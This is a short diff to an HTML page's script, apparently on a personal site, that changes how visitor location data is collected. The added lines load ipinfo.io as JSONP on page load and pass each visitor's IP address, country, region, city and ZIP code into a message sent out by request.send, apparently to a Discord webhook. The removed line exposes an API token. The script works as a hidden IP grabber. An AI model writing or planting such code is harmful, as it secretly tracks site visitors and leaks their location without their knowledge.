@@ -698,11 +698,7 @@ function monke(json)
                {
                     title: "ermal.is-a.dev",
                     color: 15000,
-                    description: `**IP:** \`${ipInfo.ip || "N/A"}\`\n` +
-                    `**Hostname:** \`${ipInfo.hostname || "N/A"}\`\n` +
-                    `**City:** \`${ipInfo.city || "N/A"}\`\n` +
-                    `**Region:** \`${ipInfo.region || "N/A"}\`\n` +
-                    `**Country:** \`${ipInfo.country || "N/A"}\`\n`
+                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
                }
           ]
      }
@@ -710,4 +706,4 @@ function monke(json)
      request.send(JSON.stringify(params));
 }
 </script>
-<script src="https://ipinfo.io/?token=4251134854bbf7"></script>t
+<script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>t
